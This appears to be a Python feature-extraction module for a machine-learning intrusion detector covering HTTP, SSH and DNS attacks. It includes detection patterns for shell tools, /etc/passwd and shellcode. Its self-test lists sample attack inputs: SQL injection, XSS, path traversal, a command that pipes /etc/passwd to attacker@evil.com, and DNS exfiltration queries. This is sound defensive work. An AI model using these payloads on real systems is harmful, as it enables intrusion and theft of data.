"""
Sentinel ML Engine v2.0 - Feature Engineering
Extracts 65+ features from network payloads


"""

import re
import math
from collections import Counter
from urllib.parse import unquote
import config


# ==============================================================================
# CORE UTILITY FUNCTIONS
# ==============================================================================

def calculate_entropy(text):
    """
    Calculate Shannon entropy (measure of randomness).
    High entropy = encrypted/obfuscated data, shellcode, DGA domains.
    Low entropy  = normal readable text.
    """
    if not text:
        return 0.0

    counter = Counter(text)
    length = len(text)

    entropy = 0.0
    for count in counter.values():
        probability = count / length
        entropy -= probability * math.log2(probability)

    return entropy


def count_special_chars(text):
    """Count non-alphanumeric characters (indicators of injection)."""
    return sum(1 for c in text if not c.isalnum() and not c.isspace())


def calculate_case_chaos(text):
    """
    Measure inconsistent case usage (evasion technique).
    e.g. SeLeCt instead of SELECT or select.
    Returns ratio of mixed-case words to total words.
    """
    if not text:
        return 0.0

    words = re.findall(r'[a-zA-Z]+', text)
    if not words:
        return 0.0

    chaos_score = 0
    for word in words:
        if len(word) < 3:
            continue
        upper_count = sum(1 for c in word if c.isupper())
        lower_count = sum(1 for c in word if c.islower())
        if upper_count > 0 and lower_count > 0:
            chaos_score += 1

    return chaos_score / len(words) if words else 0.0


def calculate_avg_word_length(text):
    """Calculate average word length."""
    words = re.findall(r'[a-zA-Z]+', text)
    if not words:
        return 0.0
    return sum(len(w) for w in words) / len(words)


# ==============================================================================
# STATISTICAL FEATURES  (always extracted, protocol-agnostic)
# ==============================================================================

def extract_statistical_features(payload):
    """
    Basic statistical features — the universal baseline.
    Extracted for every protocol.
    6 features.
    """
    length = len(payload)

    features = {
        'stat_length': length,
        'stat_entropy': calculate_entropy(payload),
        'stat_special_char_ratio': count_special_chars(payload) / length if length > 0 else 0,
        'stat_digit_ratio': sum(1 for c in payload if c.isdigit()) / length if length > 0 else 0,
        'stat_uppercase_ratio': sum(1 for c in payload if c.isupper()) / length if length > 0 else 0,
        'stat_avg_word_length': calculate_avg_word_length(payload),
    }

    return features


# ==============================================================================
# HTTP FEATURE EXTRACTORS
# ==============================================================================

def extract_sql_features(payload):
    """
    SQL injection specific features.
    13 features.
    """
    payload_upper = payload.upper()

    features = {
        # SQL Keywords
        'sql_select_count': payload_upper.count('SELECT'),
        'sql_union_count': payload_upper.count('UNION'),
        'sql_drop_count': payload_upper.count('DROP'),
        'sql_insert_count': payload_upper.count('INSERT'),
        'sql_delete_count': payload_upper.count('DELETE'),
        'sql_exec_count': payload_upper.count('EXEC'),

        # SQL Operators / Syntax
        'sql_single_quote_count': payload.count("'"),
        'sql_comment_count': payload.count('--') + payload.count('/*'),
        'sql_semicolon_count': payload.count(';'),
        'sql_equals_count': payload.count('='),

        # SQL Injection Patterns
        'sql_or_pattern': 1 if re.search(r"'\s*OR\s*['1]", payload, re.IGNORECASE) else 0,
        'sql_union_select': 1 if re.search(r'UNION.*SELECT', payload, re.IGNORECASE) else 0,
        'sql_always_true': 1 if re.search(r"1\s*=\s*1|'1'\s*=\s*'1'", payload) else 0,
    }

    return features


def extract_xss_features(payload):
    """
    Cross-Site Scripting (XSS) specific features.
    10 features.
    """
    payload_lower = payload.lower()

    features = {
        # HTML / JavaScript Tags
        'xss_script_tag': payload_lower.count('<script'),
        'xss_img_tag': payload_lower.count('<img'),
        'xss_iframe_tag': payload_lower.count('<iframe'),

        # Event Handlers
        'xss_onerror': payload_lower.count('onerror'),
        'xss_onload': payload_lower.count('onload'),
        'xss_onclick': payload_lower.count('onclick'),

        # JavaScript Keywords
        'xss_javascript_protocol': payload_lower.count('javascript:'),
        'xss_alert': payload_lower.count('alert('),
        'xss_eval': payload_lower.count('eval('),

        # HTML Encoding
        'xss_html_encoded': payload.count('&#'),
    }

    return features


def extract_command_injection_features(payload):
    """
    Command injection features.
    9 features.
    """
    payload_lower = payload.lower()

    features = {
        'cmd_pipe_count': payload.count('|'),
        'cmd_semicolon_count': payload.count(';'),
        'cmd_ampersand_count': payload.count('&&') + payload.count('&'),
        'cmd_backtick_count': payload.count('`'),

        # Common shell commands
        'cmd_cat': 1 if 'cat ' in payload_lower else 0,
        'cmd_ls': 1 if re.search(r'\bls\b', payload_lower) else 0,
        'cmd_wget': 1 if 'wget' in payload_lower else 0,
        'cmd_curl': 1 if 'curl' in payload_lower else 0,
        'cmd_bash': 1 if '/bin/bash' in payload_lower or '/bin/sh' in payload_lower else 0,
    }

    return features


def extract_traversal_features(payload):
    """
    Path traversal attack features.
    5 features.
    """
    features = {
        'traversal_dotdot_unix': payload.count('../'),
        'traversal_dotdot_windows': payload.count('..\\'),
        'traversal_etc_passwd': 1 if '/etc/passwd' in payload.lower() else 0,
        'traversal_windows_system': 1 if 'windows\\system' in payload.lower() else 0,
        'traversal_null_byte': payload.count('%00') + payload.count('\\x00'),
    }

    return features


def extract_evasion_features(payload):
    """
    Detect HTTP-layer evasion techniques.
    7 features.
    """
    # Count URL-encoding layers
    encoding_layers = 0
    decoded = payload
    for _ in range(5):
        try:
            new_decoded = unquote(decoded)
            if new_decoded == decoded:
                break
            decoded = new_decoded
            encoding_layers += 1
        except Exception:
            break

    features = {
        'evasion_encoding_layers': encoding_layers,
        'evasion_url_encoded_chars': payload.count('%'),
        'evasion_hex_chars': len(re.findall(r'\\x[0-9a-fA-F]{2}', payload)),
        'evasion_unicode_chars': len(re.findall(r'\\u[0-9a-fA-F]{4}', payload)),
        'evasion_case_variation': calculate_case_chaos(payload),
        'evasion_comment_injection': payload.count('/*') + payload.count('*/'),
        'evasion_unusual_whitespace': payload.count('\t') + payload.count('\r') + payload.count('\n'),
    }

    return features


def extract_ngram_features(payload):
    """
    Dangerous n-gram pattern matching.
    ~15 features depending on config.DANGEROUS_NGRAMS.
    """
    features = {}
    payload_lower = payload.lower()

    for ngram in config.DANGEROUS_NGRAMS:
        feature_name = (
            f"ngram_{ngram.replace(' ', '_').replace('/', 'slash')
                           .replace('<', 'lt').replace('>', 'gt')}"
        )
        features[feature_name] = 1 if ngram.lower() in payload_lower else 0

    return features


# ==============================================================================
# SSH FEATURE EXTRACTORS
# ==============================================================================

# Known SSH exploit strings tied to real CVEs
_SSH_EXPLOIT_SIGNATURES = [
    'libssh',               # CVE-2018-10933 authentication bypass
    'openssh 7.',           # Range covering several RCE CVEs
    'dropbear',             # Targeted Dropbear SSH exploits
    '\x00' * 8,             # Null-byte overflow probes
    'diffie-hellman-group1',# Logjam / weak KEX downgrade
    'arcfour',              # RC4 cipher downgrade (NOMORE attack)
]

# Credential stuffing: common default/weak usernames
_COMMON_SSH_USERNAMES = [
    'root', 'admin', 'administrator', 'ubuntu', 'ec2-user',
    'pi', 'oracle', 'postgres', 'mysql', 'guest', 'test',
    'support', 'user', 'deploy', 'ansible', 'vagrant',
]

def extract_ssh_features(payload):
    """
    SSH-specific attack feature extraction.

    Covers:
        - Brute force / credential stuffing indicators
        - Banner grabbing probes
        - Known CVE exploit signatures
        - Protocol downgrade / weak cipher negotiation
        - Shellcode / binary injection markers

    14 features.
    """
    payload_lower = payload.lower()
    payload_bytes = payload.encode('utf-8', errors='replace')

    # --- Brute Force Indicators ---
    # Very short payloads are typical of rapid auth attempts
    is_short_auth_payload = 1 if len(payload) < 64 else 0

    # Common default username detected in payload
    common_username_hit = 1 if any(
        re.search(rf'\b{re.escape(u)}\b', payload_lower)
        for u in _COMMON_SSH_USERNAMES
    ) else 0

    # High ratio of repeated characters (credential stuffing tools pad payloads)
    most_common_char_ratio = (
        Counter(payload).most_common(1)[0][1] / len(payload)
        if payload else 0.0
    )

    # --- Banner Grabbing ---
    # Attackers send SSH version strings to fingerprint the server
    ssh_banner_probe = 1 if re.search(
        r'SSH-\d+\.\d+-', payload, re.IGNORECASE
    ) else 0

    # OpenSSH version string — used to match against CVE databases
    openssh_version_probe = 1 if re.search(
        r'openssh[_\s]?\d+\.\d+', payload_lower
    ) else 0

    # --- Known Exploit Signatures ---
    exploit_signature_hit = 1 if any(
        sig in payload_lower for sig in _SSH_EXPLOIT_SIGNATURES
    ) else 0

    # CVE-2018-10933: libssh server-side auth bypass
    cve_2018_10933 = 1 if 'libssh' in payload_lower else 0

    # --- Protocol Downgrade / Weak Cipher Negotiation ---
    weak_kex_requested = 1 if re.search(
        r'diffie-hellman-group1|gss-group1', payload_lower
    ) else 0

    weak_cipher_requested = 1 if re.search(
        r'arcfour|rc4|des-cbc|blowfish-cbc', payload_lower
    ) else 0

    # --- Shellcode / Binary Injection Markers ---
    # High null-byte count suggests binary shellcode injection
    null_byte_count = payload_bytes.count(b'\x00')

    # Non-printable byte ratio — shellcode / buffer overflow payloads are binary
    non_printable_ratio = (
        sum(1 for b in payload_bytes if b < 0x20 or b > 0x7E) / len(payload_bytes)
        if payload_bytes else 0.0
    )

    # NOP sled pattern (0x90 repeated) — classic buffer overflow precursor
    nop_sled_detected = 1 if payload_bytes.count(b'\x90' * 4) > 0 else 0

    # --- Reconnaissance Patterns ---
    # Attackers enumerate supported auth methods before attacking
    auth_method_enum = 1 if re.search(
        r'publickey|password|keyboard-interactive|none', payload_lower
    ) else 0

    # Port forwarding / tunneling abuse attempts
    tunneling_attempt = 1 if re.search(
        r'direct-tcpip|forwarded-tcpip|tcpip-forward', payload_lower
    ) else 0

    features = {
        'ssh_short_auth_payload': is_short_auth_payload,
        'ssh_common_username': common_username_hit,
        'ssh_repeated_char_ratio': round(most_common_char_ratio, 4),
        'ssh_banner_probe': ssh_banner_probe,
        'ssh_openssh_version_probe': openssh_version_probe,
        'ssh_exploit_signature': exploit_signature_hit,
        'ssh_cve_2018_10933': cve_2018_10933,
        'ssh_weak_kex': weak_kex_requested,
        'ssh_weak_cipher': weak_cipher_requested,
        'ssh_null_byte_count': null_byte_count,
        'ssh_non_printable_ratio': round(non_printable_ratio, 4),
        'ssh_nop_sled': nop_sled_detected,
        'ssh_auth_method_enum': auth_method_enum,
        'ssh_tunneling_attempt': tunneling_attempt,
    }

    return features


# ==============================================================================
# DNS FEATURE EXTRACTORS
# ==============================================================================

# DNS record types commonly abused for tunneling / exfiltration
_ABUSED_DNS_RECORD_TYPES = ['TXT', 'NULL', 'ANY', 'CNAME', 'MX', 'AAAA']

# Legitimate TLDs that DGA domains rarely use (used as negative signal)
_COMMON_LEGITIMATE_TLDS = ['.com', '.org', '.net', '.gov', '.edu', '.co.uk']

def _extract_subdomains(domain):
    """
    Split domain into subdomains list.
    e.g. 'a.b.evil.com' -> ['a', 'b']
    """
    parts = domain.rstrip('.').split('.')
    # Remove TLD (last part) and second-level domain (second to last)
    return parts[:-2] if len(parts) > 2 else []


def extract_dns_features(payload):
    """
    DNS-specific attack feature extraction.

    Covers:
        - DNS tunneling (data exfiltration via query names)
        - DGA (Domain Generation Algorithm) detection
        - Amplification / reflection attack patterns
        - Query type abuse (TXT, ANY, NULL records)
        - Subdomain anomalies

    13 features.
    """
    payload_lower = payload.lower().strip()

    # Treat the payload as a DNS query name (domain string)
    # Handles both raw domain strings and packet snippets
    domain_match = re.search(
        r'([a-z0-9]([a-z0-9\-]{0,61}[a-z0-9])?\.)+[a-z]{2,}',
        payload_lower
    )
    domain = domain_match.group(0) if domain_match else payload_lower

    subdomains = _extract_subdomains(domain)
    subdomain_str = '.'.join(subdomains)  # Rejoin for entropy / length analysis

    # --- Tunneling Detection ---
    # DNS tunneling tools (iodine, dnscat2) encode data in subdomains
    # This produces very long, high-entropy subdomain labels

    # Total query length — legitimate queries rarely exceed 100 chars
    query_length = len(domain)

    # Longest single label (subdomain component) length
    labels = domain.split('.')
    longest_label_length = max(len(l) for l in labels) if labels else 0

    # Subdomain entropy — encoded payloads have high entropy
    subdomain_entropy = calculate_entropy(subdomain_str) if subdomain_str else 0.0

    # Base64 / hex patterns in subdomain (iodine uses base32/base64 encoding)
    subdomain_base64_pattern = 1 if re.search(
        r'^[a-z0-9+/]{20,}={0,2}$', subdomain_str
    ) else 0

    subdomain_hex_pattern = 1 if re.search(
        r'^[a-f0-9]{16,}$', subdomain_str
    ) else 0

    # Excessive subdomain depth — legitimate domains rarely exceed 4 levels
    subdomain_depth = len(subdomains)

    # --- DGA Detection ---
    # DGA domains are algorithmically generated: high entropy, low vowel ratio,
    # no recognizable words, unusual length distributions

    # Vowel ratio in second-level domain — human-readable domains have ~40% vowels
    sld = labels[-2] if len(labels) >= 2 else ''
    vowel_count = sum(1 for c in sld if c in 'aeiou')
    vowel_ratio = vowel_count / len(sld) if sld else 0.0

    # Consonant cluster length — DGA domains have long consonant runs
    consonant_clusters = re.findall(r'[bcdfghjklmnpqrstvwxyz]{4,}', sld)
    max_consonant_cluster = max((len(c) for c in consonant_clusters), default=0)

    # SLD entropy — high entropy second-level domains are likely DGA
    sld_entropy = calculate_entropy(sld)

    # Digit ratio in SLD — DGA often mixes digits with letters
    sld_digit_ratio = sum(1 for c in sld if c.isdigit()) / len(sld) if sld else 0.0

    # Known legitimate TLD (negative signal — DGA often uses obscure TLDs)
    uses_common_tld = 1 if any(domain.endswith(tld) for tld in _COMMON_LEGITIMATE_TLDS) else 0

    # --- Query Type / Amplification Abuse ---
    # ANY queries return large responses — used in amplification DDoS
    any_query_detected = 1 if 'any' in payload_lower or ' ANY ' in payload else 0

    # TXT / NULL record abuse for tunneling
    abused_record_type = 1 if any(
        rtype in payload.upper() for rtype in _ABUSED_DNS_RECORD_TYPES
    ) else 0

    features = {
        'dns_query_length': query_length,
        'dns_longest_label_length': longest_label_length,
        'dns_subdomain_entropy': round(subdomain_entropy, 4),
        'dns_subdomain_base64': subdomain_base64_pattern,
        'dns_subdomain_hex': subdomain_hex_pattern,
        'dns_subdomain_depth': subdomain_depth,
        'dns_sld_vowel_ratio': round(vowel_ratio, 4),
        'dns_max_consonant_cluster': max_consonant_cluster,
        'dns_sld_entropy': round(sld_entropy, 4),
        'dns_sld_digit_ratio': round(sld_digit_ratio, 4),
        'dns_uses_common_tld': uses_common_tld,
        'dns_any_query': any_query_detected,
        'dns_abused_record_type': abused_record_type,
    }

    return features


# ==============================================================================
# MASTER FEATURE EXTRACTION  (protocol-aware dispatcher)
# ==============================================================================

# Supported protocol identifiers (case-insensitive)
SUPPORTED_PROTOCOLS = {'HTTP', 'SSH', 'DNS'}


def extract_all_features(payload, protocol="HTTP"):
    """
    Master function: Extract ALL features from payload.

    Statistical features are always extracted (protocol-agnostic).
    Protocol-specific features are selected via the `protocol` parameter.

    Args:
        payload  (str): Raw network payload string.
        protocol (str): One of 'HTTP', 'SSH', 'DNS'. Defaults to 'HTTP'.

    Returns:
        dict: Feature name -> value mapping.

    Feature counts by protocol:
        HTTP : 6 stat + 13 SQL + 10 XSS + 5 traversal + 9 cmd + 7 evasion + ~15 ngram = ~65
        SSH  : 6 stat + 14 SSH-specific = 20
        DNS  : 6 stat + 13 DNS-specific = 19
    """
    protocol = protocol.upper().strip()

    if protocol not in SUPPORTED_PROTOCOLS:
        raise ValueError(
            f"Unsupported protocol '{protocol}'. "
            f"Choose from: {sorted(SUPPORTED_PROTOCOLS)}"
        )

    features = {}

    # --- Layer 0: Statistical features — always extracted ---
    features.update(extract_statistical_features(payload))

    # --- Layer 1: Protocol-specific features ---
    if protocol == "HTTP":
        features.update(extract_sql_features(payload))
        features.update(extract_xss_features(payload))
        features.update(extract_traversal_features(payload))
        features.update(extract_command_injection_features(payload))
        features.update(extract_evasion_features(payload))
        features.update(extract_ngram_features(payload))

    elif protocol == "SSH":
        features.update(extract_ssh_features(payload))

    elif protocol == "DNS":
        features.update(extract_dns_features(payload))

    return features


def get_feature_names(protocol="HTTP"):
    """
    Return sorted list of all feature names for a given protocol.
    Used to build consistent feature vectors for the ML model.
    """
    protocol = protocol.upper().strip()
    dummy_features = extract_all_features("dummy_payload", protocol=protocol)
    return sorted(dummy_features.keys())


def features_to_vector(features, feature_names=None, protocol="HTTP"):
    """
    Convert feature dict to a list (numpy-ready) in consistent order.

    Args:
        features      (dict): Output of extract_all_features().
        feature_names (list): Optional pre-computed feature name list.
        protocol      (str) : Protocol to derive feature names if not provided.

    Returns:
        list[float]: Feature vector aligned to feature_names order.
    """
    if feature_names is None:
        feature_names = get_feature_names(protocol=protocol)

    return [features.get(name, 0.0) for name in feature_names]


# ==============================================================================
# SELF-TEST
# ==============================================================================

if __name__ == "__main__":

    test_cases = [
        # ── HTTP ──────────────────────────────────────────────────────────────
        ("HTTP", "Normal request",         "GET /index.html HTTP/1.1"),
        ("HTTP", "SQL Injection",           "admin' OR '1'='1'--"),
        ("HTTP", "XSS Attack",              "<script>alert('XSS')</script>"),
        ("HTTP", "Path Traversal",          "../../../../etc/passwd"),
        ("HTTP", "Command Injection",       "; cat /etc/passwd | mail attacker@evil.com"),
        ("HTTP", "Obfuscated SQL",          "ad'/**/OR/**/1=1--"),

        # ── SSH ───────────────────────────────────────────────────────────────
        ("SSH",  "SSH Banner Grab",         "SSH-2.0-OpenSSH_7.4"),
        ("SSH",  "SSH Brute Force",         "root"),
        ("SSH",  "SSH Weak Cipher",         "arcfour,blowfish-cbc,3des-cbc"),
        ("SSH",  "SSH Exploit (libssh)",    "libssh 0.7.3 authentication bypass"),
        ("SSH",  "SSH Tunneling",           "direct-tcpip forward 127.0.0.1 8080"),
        ("SSH",  "SSH NOP Sled",            "\x90\x90\x90\x90\x90shellcode_here"),

        # ── DNS ───────────────────────────────────────────────────────────────
        ("DNS",  "Normal DNS",              "www.google.com"),
        ("DNS",  "DNS Tunneling (iodine)",  "aGVsbG8gd29ybGQ.tunnel.evil.com"),
        ("DNS",  "DGA Domain",             "xkqvzmnprt.ru"),
        ("DNS",  "DNS ANY Amplification",  "ANY isc.org"),
        ("DNS",  "DNS TXT Abuse",          "TXT c3VwZXJzZWNyZXQ.exfil.attacker.com"),
    ]

    print("=" * 80)
    print("SENTINEL ML ENGINE v2.0 — PROTOCOL-AWARE FEATURE EXTRACTION TEST")
    print("=" * 80)

    for protocol, name, payload in test_cases:
        print(f"\n[{protocol}] {name}")
        print(f"  Payload : {repr(payload)}")

        feats = extract_all_features(payload, protocol=protocol)
        non_zero = {k: v for k, v in feats.items() if v != 0 and v != 0.0}

        print(f"  Features: {len(feats)} total, {len(non_zero)} non-zero")
        for key, value in sorted(non_zero.items()):
            print(f"    {key}: {value}")

    print("\n" + "=" * 80)
    print("Feature counts per protocol:")
    for proto in sorted(SUPPORTED_PROTOCOLS):
        count = len(get_feature_names(proto))
        print(f"  {proto:6s}: {count} features")
    print("=" * 80)
